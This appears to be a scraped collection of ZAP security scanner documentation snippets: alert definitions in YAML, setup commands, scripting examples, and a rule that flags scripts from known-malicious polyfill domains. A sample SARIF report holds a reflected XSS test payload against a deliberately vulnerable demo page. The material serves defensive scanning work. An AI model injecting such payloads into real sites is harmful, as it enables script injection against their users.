DESCRIPTION: YAML configuration for a ZAP passive scan rule alert. It specifies alert details, risk level, solution advice, and related security standards.

LANGUAGE: yaml
CODE:
---
title: "Hash Disclosure - MD4 / MD5"
alertid: 10097
alertindex: 1009700
alerttype: "Passive"
alertcount: 1
status: release
type: alert
risk: Low
solution: "Ensure that hashes that are used to protect credentials or other resources are not leaked by the web server or database. There is typically no requirement for password hashes to be accessible to the web browser."
references:
   - https://openwall.info/wiki/john/sample-hashes
other: ""
cwe: 497
wasc: 13
alerttags: 
  - CWE-497
  - OWASP_2017_A03
  - OWASP_2021_A04
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/HashDisclosureScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrules/HashDisclosureScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/passive-scan-rules/#id-10097
---

----------------------------------------

TITLE: ViewState Disclosure Alert Definition in YAML
DESCRIPTION: YAML configuration defining metadata for an ASP.NET ViewState disclosure security alert, including risk level, solutions, and references.

LANGUAGE: yaml
CODE:
title: "ASP.NET ViewState Disclosure"
alertid: 10094-1
alertindex: 1009401
alerttype: "Passive"
alertcount: 3
status: alpha
type: alert
risk: Informational
solution: "Manually confirm that the ASP.NET ViewState does not leak sensitive information, and that the data cannot be aggregated/used to exploit other vulnerabilities."
references:
   - https://learn.microsoft.com/en-us/previous-versions/bb386448(v=vs.140)
   - https://projects.webappsec.org/w/page/13246936/Information%20Leakage
other: ""
cwe: 319
wasc: 13
alerttags: 
  - CWE-319
  - OWASP_2017_A03
  - OWASP_2021_A04
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrulesAlpha/src/main/java/org/zaproxy/zap/extension/pscanrulesAlpha/Base64Disclosure.java
linktext: "org/zaproxy/zap/extension/pscanrulesAlpha/Base64Disclosure.java"
help: https://www.zaproxy.org/docs/desktop/addons/passive-scan-rules-alpha/#id-10094

----------------------------------------

TITLE: External Redirect Vulnerability Example
DESCRIPTION: The document references an external redirect vulnerability where the application's Refresh header can be manipulated to redirect to malicious external URLs. This represents a high-risk security issue that requires proper input validation and URL allowlisting.

LANGUAGE: text
CODE:
The response contains a redirect in its Refresh header which allows an external Url to be set.

----------------------------------------

TITLE: Scanner Configuration YAML Definition
DESCRIPTION: YAML configuration for the User Controllable HTML Element Attribute scanner defining alert properties, risk level, solution guidance, and related security references.

LANGUAGE: yaml
CODE:
title: "User Controllable HTML Element Attribute (Potential XSS)"
alertid: 10031
alertindex: 1003100
alerttype: "Passive"
alertcount: 1
status: release
type: alert
risk: Informational
solution: "Validate all input and sanitize output it before writing to any HTML attributes."
references:
   - https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
other: "User-controlled HTML attribute values were found. Try injecting special characters to see if XSS might be possible. The page at the following URL:  http://example.com/i.php?name=fred  appears to include user input in: a(n) [img] tag [alt] attribute  The user input found was: name=fred  The user-controlled value was: pscanrules.usercontrolledhtmlattributes."
cwe: 20
wasc: 20
alerttags: 
  - CWE-20
  - OWASP_2017_A01
  - OWASP_2021_A03

----------------------------------------

TITLE: YAML Frontmatter Configuration for Directory List v1.0 Documentation
DESCRIPTION: YAML configuration header that specifies metadata for the documentation page, including the title, type, weight and add-on details.

LANGUAGE: yaml
CODE:
# This page was generated from the add-on.
title: Directory List v1.0
type: userguide
weight: 1
cascade:
  addon:
    id: directorylistv1
    version: 9.0.0

----------------------------------------

TITLE: Installing Specific ZAP Add-ons
DESCRIPTION: These commands demonstrate how to install specific ZAP add-ons (ascanrules and pscanrules) using Gradle tasks.

LANGUAGE: bash
CODE:
./gradlew addOns:ascanrules:copyZapAddOn
./gradlew addOns:pscanrules:copyZapAddOn

----------------------------------------

TITLE: Defining ZAP Scanner Alert for Insufficient Site Isolation (YAML)
DESCRIPTION: YAML configuration for ZAP scanner alert 90004, which detects insufficient site isolation against Spectre vulnerability. It defines multiple sub-alerts with unique IDs and includes metadata such as alert type, status, and associated code file.

LANGUAGE: yaml
CODE:
title: "Insufficient Site Isolation Against Spectre Vulnerability"
alertid: 90004
alertindex: 9000400
alerttype: "Passive"
status: beta
type: alertset
alerts:
   90004-1:
      alertid: 90004-1
      name: "Insufficient Site Isolation Against Spectre Vulnerability"
   90004-2:
      alertid: 90004-2
      name: "Insufficient Site Isolation Against Spectre Vulnerability"
   90004-3:
      alertid: 90004-3
      name: "Insufficient Site Isolation Against Spectre Vulnerability"
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrulesBeta/src/main/java/org/zaproxy/zap/extension/pscanrulesBeta/SiteIsolationScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrulesBeta/SiteIsolationScanRule.java"

----------------------------------------

TITLE: Defining HTTPS Content Available via HTTP Alert in YAML
DESCRIPTION: YAML configuration for a ZAP security alert that detects HTTPS content accessible via HTTP. It specifies alert details, risk level, solution, references, and associated tags.

LANGUAGE: yaml
CODE:
title: "HTTPS Content Available via HTTP"
alertid: 10047
alertindex: 1004700
alerttype: "Active"
alertcount: 1
status: beta
type: alert
risk: Low
solution: "Ensure that your web server, application server, load balancer, etc. is configured to only serve such content via HTTPS. Consider implementing HTTP Strict Transport Security."
references:
   - https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html
   - https://owasp.org/www-community/Security_Headers
   - https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security
   - https://caniuse.com/stricttransportsecurity
   - https://datatracker.ietf.org/doc/html/rfc6797
other: "ZAP attempted to connect via: http://example.org/"
cwe: 311
wasc: 4
alerttags: 
  - CWE-311
  - OWASP_2017_A06
  - OWASP_2021_A05
  - POLICY_QA_FULL
  - WSTG-v42-CRYP-03
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrulesBeta/src/main/java/org/zaproxy/zap/extension/ascanrulesBeta/HttpsAsHttpScanRule.java
linktext: "org/zaproxy/zap/extension/ascanrulesBeta/HttpsAsHttpScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/active-scan-rules-beta/#id-10047

----------------------------------------

TITLE: Implementing Cross-Domain Misconfiguration Scan Rule in Java
DESCRIPTION: This code snippet represents the implementation of the Cross-Domain Misconfiguration scan rule in ZAP. It's part of the passive scan rules and checks for CORS misconfigurations that could allow unauthorized cross-domain access.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/CrossDomainMisconfigurationScanRule.java

----------------------------------------

TITLE: Defining F5 BIG-IP Cookie Information Disclosure Alert in YAML
DESCRIPTION: YAML configuration for a ZAP passive scan alert that detects when F5 BIG-IP persistence cookies expose internal network information. The alert includes risk level, solution guidance, and relevant security standard mappings like CWE and WASC.

LANGUAGE: yaml
CODE:
title: "Information Disclosure - IP Exposed via F5 BIG-IP Persistence Cookie"
alertid: 100006
alertindex: 10000600
alerttype: "Script Passive"
alertcount: 1
status: alpha
type: alert
risk: Informational
solution: "Configure BIG-IP cookie encryption."
references:
   - https://support.f5.com/kb/en-us/solutions/public/6000/900/sol6917.html
other: ""
cwe: 311
wasc: 13
alerttags: 
  - CWE-311
code: https://github.com/zaproxy/community-scripts/blob/main/passive/f5_bigip_cookie_internal_ip.js
linktext: "passive/f5_bigip_cookie_internal_ip.js"
help: https://www.zaproxy.org/docs/desktop/addons/community-scripts/

----------------------------------------

TITLE: Alert Definition in YAML
DESCRIPTION: YAML configuration for the Charset Mismatch security alert in ZAP, defining alert properties, risk level, and related security standards references.

LANGUAGE: yaml
CODE:
title: "Charset Mismatch"
alertid: 90011
alertindex: 9001100
alerttype: "Passive"
alertcount: 1
status: release
type: alert
risk: Informational
solution: "Force UTF-8 for all text content in both the HTTP header and meta tags in HTML or encoding declarations in XML."
references:
   - https://code.google.com/p/browsersec/wiki/Part2#Character_set_handling_and_detection
other: ""
cwe: 436
wasc: 15
alerttags: 
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/CharsetMismatchScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrules/CharsetMismatchScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/passive-scan-rules/#id-90011

----------------------------------------

TITLE: Implementing Base64 Disclosure Detection in Java for OWASP ZAP
DESCRIPTION: This code snippet implements the Base64 Disclosure passive scan rule for OWASP ZAP. It detects Base64 encoded data in web application responses, which could potentially leak sensitive information.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrulesAlpha/src/main/java/org/zaproxy/zap/extension/pscanrulesAlpha/Base64Disclosure.java

----------------------------------------

TITLE: Detecting Email Addresses in HTTP Responses using JavaScript
DESCRIPTION: This script passively scans HTTP response bodies for email addresses. It is part of the ZAP community scripts and helps identify potential information disclosure vulnerabilities.

LANGUAGE: javascript
CODE:
https://github.com/zaproxy/community-scripts/blob/main/passive/Find%20Emails.js

----------------------------------------

TITLE: Defining HTTP Server Response Header Alerts in YAML
DESCRIPTION: YAML configuration for ZAP alerts related to HTTP Server Response Header. It defines two alerts: one for webserver application leakage and another for version information leakage via the 'Server' header.

LANGUAGE: yaml
CODE:
title: "HTTP Server Response Header"
alertid: 10036
alertindex: 1003600
alerttype: "Passive"
status: release
type: alertset
alerts:
   10036-1:
      alertid: 10036-1
      name: "Server Leaks its Webserver Application via \"Server\" HTTP Response Header Field"
   10036-2:
      alertid: 10036-2
      name: "Server Leaks Version Information via \"Server\" HTTP Response Header Field"
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/ServerHeaderInfoLeakScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrules/ServerHeaderInfoLeakScanRule.java"

----------------------------------------

TITLE: Configuring Viewstate Security Alert Parameters
DESCRIPTION: YAML configuration for a security alert that detects ASP.NET Viewstate implementations without MAC signatures. Defines alert metadata, risk level, solution recommendations, and related security standards references.

LANGUAGE: yaml
CODE:
title: "Viewstate without MAC Signature (Sure)"
alertid: 10032-5
alertindex: 1003205
alerttype: "Passive"
alertcount: 6
status: release
type: alert
risk: High
solution: "Ensure the MAC is set for all pages on this website."
references:
   - https://learn.microsoft.com/en-us/previous-versions/msp-n-p/ff649308(v=pandp.10)
other: ""
cwe: 642
wasc: 14
alerttags: 
  - CWE-642
  - OWASP_2017_A06
  - OWASP_2021_A04
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/ViewstateScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrules/ViewstateScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/passive-scan-rules/#id-10032

----------------------------------------

TITLE: Configuring WebDrivers Add-on in YAML
DESCRIPTION: YAML configuration block defining the title, type, weight and add-on details for the MacOS WebDrivers documentation page.

LANGUAGE: yaml
CODE:
title: MacOS WebDrivers
type: userguide
weight: 1
cascade:
  addon:
    id: webdrivermacos
    version: 129.0.0

----------------------------------------

TITLE: Cloning ZAP Repositories
DESCRIPTION: These commands clone the main ZAP repositories (zaproxy and zap-extensions) to the local machine using git.

LANGUAGE: bash
CODE:
git clone https://github.com/zaproxy/zaproxy.git
git clone https://github.com/zaproxy/zap-extensions.git

----------------------------------------

TITLE: Detecting Reflected HTTP GET Parameters in Python for ZAP
DESCRIPTION: This script is a passive scanner for ZAP that identifies reflected HTTP GET parameters in responses. It helps detect potential vulnerabilities like XSS or HTTP header injection. The script is located at 'passive/find_reflected_params.py' in the ZAP community scripts repository.

LANGUAGE: python
CODE:
https://github.com/zaproxy/community-scripts/blob/main/passive/find_reflected_params.py

----------------------------------------

TITLE: Java Stack Trace Information Disclosure Alert Definition
DESCRIPTION: YAML frontmatter defining an alert for detecting exposed Java stack traces in HTTP responses. Includes risk level, solution guidance, and relevant security standards (CWE-209, WASC-13).

LANGUAGE: markdown
CODE:
---
title: "Information Disclosure - Java Stack Trace"
alertid: 100035
alertindex: 10003500
alerttype: "Script Passive"
alertcount: 1
status: alpha
type: alert
risk: Medium
solution: "Catch and handle exceptions properly, avoiding the exposure of stack traces to users. Configure the web server or application framework to log stack traces instead of displaying them. "
other: ""
cwe: 209
wasc: 13
alerttags: 
  - CWE-209
code: https://github.com/zaproxy/community-scripts/blob/main/passive/JavaDisclosure.js
linktext: "passive/JavaDisclosure.js"
help: https://www.zaproxy.org/docs/desktop/addons/community-scripts/
---

----------------------------------------

TITLE: Defining ZAP Alert Metadata for CVE-2019-5418 in YAML
DESCRIPTION: YAML frontmatter defining metadata for a ZAP alert script detecting the File Content Disclosure vulnerability (CVE-2019-5418). It specifies alert properties, risk level, solution, references, and associated tags.

LANGUAGE: yaml
CODE:
---
title: "File Content Disclosure (CVE-2019-5418)"
alertid: 100029
alertindex: 10002900
alerttype: "Script Active"
alertcount: 1
status: alpha
type: alert
risk: High
solution: "Upgrade to a version of Ruby/Rails where this issue is fixed. (See references for further details). "
references:
   - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5418
   - https://github.com/mpgn/CVE-2019-5418
other: ""
cwe: 74
wasc: 33
alerttags: 
  - CWE-74
  - OWASP_2017_A01
  - OWASP_2021_A03
  - WSTG-v42-ATHZ-01
code: https://github.com/zaproxy/community-scripts/blob/main/active/cve-2019-5418.js
linktext: "active/cve-2019-5418.js"
help: https://www.zaproxy.org/docs/desktop/addons/community-scripts/
---

----------------------------------------

TITLE: Initializing HttpSender Object in BeanShell Console (Java)
DESCRIPTION: This snippet shows the declaration of an HttpSender object available in the BeanShell Console. It demonstrates that ZAP provides pre-initialized objects for use in scripts.

LANGUAGE: java
CODE:
HttpSender

----------------------------------------

TITLE: Detecting Relative Path Overwrite in JavaScript
DESCRIPTION: This script, located at passive/RPO.js in the ZAProxy community scripts repository, implements passive detection of Relative Path Overwrite vulnerabilities. It analyzes web responses to identify potential RPO issues.

LANGUAGE: javascript
CODE:
https://github.com/zaproxy/community-scripts/blob/main/passive/RPO.js

----------------------------------------

TITLE: GraphQL Schema Definition Example
DESCRIPTION: Example schema showing a Query type with a polygon field that returns a Polygon type with area and perimeter fields

LANGUAGE: graphql
CODE:
type  Query {
   polygon (sides: Int, regular: Boolean): Polygon
}

type  Polygon {
   perimeter: Float
   area: Float
}

----------------------------------------

TITLE: Generating SARIF JSON Report for Security Analysis in zaproxy
DESCRIPTION: This snippet demonstrates the structure of a SARIF JSON report used in the zaproxy project. It includes details about security vulnerabilities, their locations, attack vectors, HTTP request and response information, and associated rules and taxonomies.

LANGUAGE: json
CODE:
{
   "runs": [
      {
         "results": [ 
            {
               "level": "error",
               "locations": [
                  {
                     "physicalLocation": {
                        "artifactLocation": {
                           "uri": "https://127.0.0.1:8080/greeting?name=%3C%2Fp%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E%3Cp%3E"
                        },
                        "region": {
                           "startLine": 10, 
                           "snippet": {
                               "text": "<\/p><script>alert(1);<\/script><p>"
                           }
                        }
                     },
                     "properties": {
                         "attack": "<\/p><script>alert(1);<\/script><p>"
                     }
                  }
               ],
               "message": {
                  "text": "Some other additional information which shall appear inside the message"
               },
               "ruleId": "40012",
               "webRequest": {
                   "protocol": "HTTP",
                   "version": "1.1",
                   "target": "https://127.0.0.1:8080/greeting?name=%3C%2Fp%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E%3Cp%3E",
                   "method": "GET",
                   "headers": {
                       "Cache-Control" : "no-cache",
                       "Content-Length" : "0",
                       "Cookie" : "JSESSIONID=38AA1F7A61982DF1073D7F43A3707798; locale=de",
                       "Host" : "127.0.0.1:8080",
                       "Pragma" : "no-cache",
                       "Referer" : "https:\/\/127.0.0.1:8080\/hello",
                       "User-Agent" : "Mozilla\/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko\/20100101 Firefox\/92.0"
                   },
                   "body": {
                       
                   }
               },
               "webResponse": {
                   "statusCode": 200,
                   "reasonPhrase": "",
                   "protocol": "HTTP",
                   "version": "1.1",
                   "headers": {
                       "Cache-Control" : "no-cache, no-store, max-age=0, must-revalidate",
                       "Content-Language" : "en-US",
                       "Content-Security-Policy" : "script-src 'self'",
                       "Content-Type" : "text\/html;charset=UTF-8",
                       "Date" : "Thu, 11 Nov 2021 09:56:20 GMT",
                       "Expires" : "0",
                       "Pragma" : "no-cache",
                       "Referrer-Policy" : "no-referrer",
                       "Set-Cookie" : "locale=de; HttpOnly; SameSite=strict",
                       "Strict-Transport-Security" : "max-age=31536000 ; includeSubDomains",
                       "X-Content-Type-Options" : "nosniff",
                       "X-Frame-Options" : "DENY",
                       "X-XSS-Protection" : "1; mode=block"
                   },
                   "body": {
                       "text": "<!DOCTYPE HTML>\n<html>\n<head>\n    <title>Getting Started: Serving Web Content<\/title>\n    <meta http-equiv=\"Content-Type\" content=\"text\/html; charset=UTF-8\" \/>\n<\/head>\n<body>\n    <!-- unsecure text used (th:utext instead th:text)- to create vulnerability (XSS) -->\n    <!-- simple usage: http:\/\/localhost:8080\/greeting?name=Test2<\/p><script>;alert(\"hallo\")<\/script> -->\n    <p >XSS attackable parameter output: <\/p><script>alert(1);<\/script><p>!<\/p>\n<\/body>\n<\/html>"
                   },
                   "noResponseReceived": false
               }
            }
         ],
         "taxonomies": [
            {
               "downloadUri": "https://cwe.mitre.org/data/xml/cwec_v4.8.xml.zip",
               "guid":  "b000a760-3e52-3565-a35c-f61369da53b7",
               "informationUri": "https://cwe.mitre.org/data/published/cwe_v4.8.pdf/",
               "isComprehensive": true,
               "language": "en",
               "minimumRequiredLocalizedDataSemanticVersion": "4.8",
               "name":  "CWE",
               "organization": "MITRE",
               "releaseDateUtc": "2022-06-28",
               "shortDescription": {
                  "text": "The MITRE Common Weakness Enumeration"
               },
               "taxa": [
                  {
                     "guid": "5dd429c8-e5e3-37a8-bf40-f7b2d72a9085",
                     "helpUri": "https://cwe.mitre.org/data/definitions/79.html",
                     "id": "79"
                  }
               ],
               "version": "4.4"
            }
         ],
         "tool": {
            "driver": {
               "guid": "840570e4-2388-38c0-8afe-ed426f2f5199",
               "informationUri": "https://www.zaproxy.org/",
               "name": "ZAP",
               "rules": [ 
                  {
                     "id": "40012",
                     "defaultConfiguration": {
                        "level": "error"
                     },
                     "fullDescription": {
                        "text": "CSS Description\nMultiple lines\n\nEnd"
                     },
                     "name": "Cross Site Scripting",
                     "properties": {
                            "references": [
                                "http://projects.webappsec.org/Cross-Site-Scripting",
                                "http://cwe.mitre.org/data/definitions/79.html"
                            ],
                            "solution": {
                                "text": "Phase: 1\n\nDo ...."
                            },
                            "confidence": "medium"
                     },
                     "relationships": [ 
                        {
                           "kinds": [
                              "superset"
                           ],
                           "target": {
                              "guid":"5dd429c8-e5e3-37a8-bf40-f7b2d72a9085",
                              "id": "79",
                              "toolComponent": {
                                 "guid": "b000a760-3e52-3565-a35c-f61369da53b7",
                                 "name": "CWE"
                              }
                           }
                        }
                        
                     ],
                     "shortDescription": {
                        "text": "Cross Site Scripting"
                     }
                  }
                  
               ],
               "semanticVersion": "Dev Build",
               "supportedTaxonomies": [ 
                  {
                     "guid": "b000a760-3e52-3565-a35c-f61369da53b7",
                     "name": "CWE"
                  }
               ],
               "version": "Dev Build"
            }
         }
      }
   ],
   "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
   "version": "2.1.0"
}

----------------------------------------

TITLE: Defining Strict-Transport-Security Disabled Alert in YAML
DESCRIPTION: YAML configuration for a ZAP passive scan rule alert that detects disabled Strict-Transport-Security headers. It specifies the alert ID, risk level, solution, and associated standards like CWE and WASC.

LANGUAGE: yaml
CODE:
---
title: "Strict-Transport-Security Disabled"
alertid: 10035-2
alertindex: 1003502
alerttype: "Passive"
alertcount: 8
status: release
type: alert
risk: Low
solution: "Review the configuration of this control. Ensure that your web server, application server, load balancer, etc. is configured to set Strict-Transport-Security with an appropriate max-age value."
references:
   - https://datatracker.ietf.org/doc/html/rfc6797#section-6.2
other: ""
cwe: 319
wasc: 15
alerttags: 
  - CWE-319
  - OWASP_2017_A06
  - OWASP_2021_A05
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/StrictTransportSecurityScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrules/StrictTransportSecurityScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/passive-scan-rules/#id-10035
---

----------------------------------------

TITLE: Implementing HSTS Max-Age Check in Java for ZAP
DESCRIPTION: This code snippet is part of a ZAP extension that checks for the presence and correctness of the max-age directive in HSTS headers. It's implemented in Java and likely contains logic to parse HTTP headers and validate the HSTS configuration.

LANGUAGE: java
CODE:
// Code not provided in the input text, but referenced at:
// https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/StrictTransportSecurityScanRule.java

----------------------------------------

TITLE: Running ZAP Automation Framework in Docker
DESCRIPTION: Command to run the ZAP Automation Framework using a YAML file in the current directory within a Docker container.

LANGUAGE: bash
CODE:
docker run -v $(pwd):/zap/wrk/:rw -t zaproxy/zap-stable zap.sh -cmd -autorun /zap/wrk/zap.yaml

----------------------------------------

TITLE: Updating Git Remotes for Contributing
DESCRIPTION: These commands update the git remotes to prepare for contributing to ZAP. They set the origin to the user's fork and add the upstream remote pointing to the main ZAP repository.

LANGUAGE: bash
CODE:
cd zaproxy
git remote set-url origin https://github.com/USERNAME/zaproxy.git
git remote add upstream https://github.com/zaproxy/zaproxy.git
cd ..

cd zap-extensions
git remote set-url origin https://github.com/USERNAME/zap-extensions.git
git remote add upstream https://github.com/zaproxy/zap-extensions.git
cd ..

----------------------------------------

TITLE: Creating and Using Tree Object in BeanShell (BeanShell)
DESCRIPTION: This snippet demonstrates how to create a Tree object and use its find method to search for 'index.html' files in the site map. It shows the loosely typed nature of BeanShell and how to interact with ZAP's site tree.

LANGUAGE: beanshell
CODE:
t = Tree();

t.find(sites.getRoot(), "index.html");

----------------------------------------

TITLE: Referencing Upload Form Discovery Script in ZAP
DESCRIPTION: This snippet shows the reference to the JavaScript file that implements the passive scan rule for discovering upload forms in ZAP. The script is part of the community-contributed scripts for ZAP.

LANGUAGE: javascript
CODE:
https://github.com/zaproxy/community-scripts/blob/main/passive/Upload%20form%20discovery.js

----------------------------------------

TITLE: Implementing Polyfill CDN Script Detection as ZAP Script
DESCRIPTION: This comprehensive script implements a scan rule to detect scripts loaded from potentially malicious 'polyfill' domains. It includes metadata definition, domain pattern matching, and alert raising logic.

LANGUAGE: javascript
CODE:
const ScanRuleMetadata = Java.type(
  "org.zaproxy.addon.commonlib.scanrules.ScanRuleMetadata",
);
const Alert = Java.type("org.parosproxy.paros.core.scanner.Alert");

const PLUGIN_ID = 10115;

function getMetadata() {
  return ScanRuleMetadata.fromYaml(`
id: ${PLUGIN_ID}
name: Script Served From Malicious Domain (polyfill)
description: |
  The page includes one or more script files loaded from one of the 'polyfill' domains.
  These are not associated with the polyfill.js library and are known to serve malicious content.
solution: >
  Change all scripts to use a known good source based on their documentation.
risk: high
confidence: high
cweId: 829  # CWE-829: Inclusion of Functionality from Untrusted Control Sphere
wascId: 15  # WASC-15: Application Misconfiguration
alertTags:
  OWASP_2017_A09: "https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities.html"
  OWASP_2021_A06: "https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/"
status: beta
`);
}

const transitiveScriptRefDescription = `The page includes one or more script which appear to include a reference to one of the 'polyfill' domains.
These are not associated with the polyfill.js library and are known to serve malicious content.
You should check to see if it is a safe reference (for example in a comment) or whether the script is loading content from that domain.`;

const POLYFILL_IO = /https?:\/\/.*polyfill\.io\/.*/i;
const BOOTCSS_COM = /https?:\/\/.*bootcss\.com\/.*/i;
const BOOTCDN_NET = /https?:\/\/.*bootcdn\.net\/.*/i;
const STATICFILE_NET = /https?:\/\/.*staticfile\.net\/.*/i;
const STATICFILE_ORG = /https?:\/\/.*staticfile\.org\/.*/i;
const UNIONADJS_COM = /https?:\/\/.*unionadjs\.com\/.*/i;
const XHSBPZA_COM = /https?:\/\/.*xhsbpza\.com\/.*/i;
const UNION_MACOMS_LA = /https?:\/\/.*union\.macoms\.la\/.*/i;
const NEWCRBPC_COM = /https?:\/\/.*newcrbpc\.com\/.*/i;

const ALL_DOMAINS = [
  POLYFILL_IO,
  BOOTCSS_COM,
  BOOTCDN_NET,
  STATICFILE_NET,
  STATICFILE_ORG,
  UNIONADJS_COM,
  XHSBPZA_COM,
  UNION_MACOMS_LA,
  NEWCRBPC_COM,
];

function scan(helper, msg, src) {
  if (
    msg.getResponseBody().length() === 0 ||
    !msg.getResponseHeader().isHtml()
  ) {
    return;
  }
  const sourceElements = src.getAllElements("script");
  if (sourceElements == null) {
    return;
  }
  let alertRaised = false;
  for (let i = 0; i < sourceElements.length; i++) {
    const sourceElement = sourceElements[i];
    const scriptSrc = sourceElement.getAttributeValue("src");
    if (scriptSrc == null) {
      continue;
    }
    for (let j = 0; j < ALL_DOMAINS.length; j++) {
      if (ALL_DOMAINS[j].test(scriptSrc)) {
        helper
          .newAlert()
          .setParam(scriptSrc)
          .setEvidence(sourceElement.toString())
          .setAlertRef(`${PLUGIN_ID}-1`)
          .raise();
        alertRaised = true;
      }
    }
  }
  if (alertRaised) {
    // Definitely an issue, no point checking the script contents
    return;
  }
  // Check the script contents, in case they are loading scripts via JS
  for (let i = 0; i < sourceElements.length; i++) {
    const contents = sourceElements[i].getContent().toString();
    for (let j = 0; j < ALL_DOMAINS.length; j++) {
      let match;
      if ((match = ALL_DOMAINS[j].exec(contents))) {
        helper
          .newAlert()
          .setConfidence(Alert.CONFIDENCE_LOW)
          .setEvidence(match[0])
          .setDescription(transitiveScriptRefDescription)
          .setAlertRef(`${PLUGIN_ID}-2`)
          .raise();
        break;
      }
    }
  }
}

----------------------------------------

TITLE: Defining WebSockets Add-on SBOM in YAML
DESCRIPTION: This YAML snippet defines the metadata and components of the WebSockets Add-on's Software Bill of Materials (SBOM). It includes information about the add-on ID, version, SBOM format, download URL, and a comprehensive list of components with their names, versions, and licenses.

LANGUAGE: yaml
CODE:
# This page was automatically generated from the add-on's SBOM.
title: WebSockets Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: websocket
    version: '32'
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/websocket-v32/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain
  - name: apiguardian-api
    version: 1.1.2
    licenses: Apache-2.0
  # ... [additional components omitted for brevity]
  - name: zap
    version: 2.16.0-SNAPSHOT
    licenses: Apache-2.0

----------------------------------------

TITLE: Configuring YAML Front Matter for Code Dx Add-on Documentation
DESCRIPTION: YAML configuration for the Code Dx add-on documentation page, specifying metadata such as title, type, weight, and add-on details.

LANGUAGE: yaml
CODE:
---
# This page was generated from the add-on.
title: Code Dx
type: userguide
weight: 1
cascade:
  addon:
    id: codedx
    version: 9.0.0
---

----------------------------------------

TITLE: Raising an Alert in ZAP Script Scan Rule
DESCRIPTION: This code snippet shows how to raise an alert within a ZAP script scan rule, overriding metadata for specific alerts if needed.

LANGUAGE: javascript
CODE:
function scan(helper, msg, src) {
  // ... 
  foundKeys = ["my-secret-key", "my-other-secret-key"]
  helper
    .newAlert()
    .setEvidence(foundKeys[0])
    .setOtherInfo(`Other instances: ${foundKeys.slice(1).toString()}`)
    .setMessage(msg)
    .raise();
}

----------------------------------------

TITLE: Implementing ViewstateScanRule in Java for ZAP
DESCRIPTION: This code snippet implements a passive scan rule in ZAP to detect split Viewstate usage in ASP.NET applications. It extends the AbstractAppParamPlugin class and likely includes methods for parsing and analyzing HTTP responses.

LANGUAGE: java
CODE:
// Code not provided in the original text, but referenced at:
// https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/ViewstateScanRule.java

----------------------------------------

TITLE: Implementing Big Redirect Detection in Java for ZAP
DESCRIPTION: This code snippet implements a passive scan rule in ZAP to detect large redirect responses. It analyzes the response size and location header to identify potential sensitive information leaks in redirect responses.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/BigRedirectsScanRule.java

----------------------------------------

TITLE: Running ZAP Headless with xvfb in Docker
DESCRIPTION: Command to start ZAP in headless mode with xvfb (X virtual frame buffer) within a Docker container, allowing add-ons that use Selenium to run.

LANGUAGE: bash
CODE:
docker run -u zap -p 8080:8080 -i zaproxy/zap-stable zap-x.sh -daemon -host 0.0.0.0 -port 8080 -config api.addrs.addr.name=.* -config api.addrs.addr.regex=true

----------------------------------------

TITLE: Deploying New Add-on (Windows)
DESCRIPTION: Gradle command to deploy the new add-on on Windows systems.

LANGUAGE: bash
CODE:
gradlew.bat addOns:myaddon:copyZapAddOn

----------------------------------------

TITLE: Website Build and Deployment Commands
DESCRIPTION: Shell commands for building and deploying the website to staging environment.

LANGUAGE: sh
CODE:
./bin/build.sh
cp -r ./dist/ ../zaproxy-website-builds
cd ../zaproxy-website-builds
git push origin staging

----------------------------------------

TITLE: Defining Cross-Site WebSocket Hijacking Alert in YAML
DESCRIPTION: YAML configuration for a ZAP alert that detects Cross-Site WebSocket Hijacking vulnerabilities. It specifies alert properties, risk level, solution, references, and associated tags.

LANGUAGE: yaml
CODE:
title: "Cross-Site WebSocket Hijacking"
alertid: 100025
alertindex: 10002500
alerttype: "Script Active"
alertcount: 1
status: alpha
type: alert
risk: High
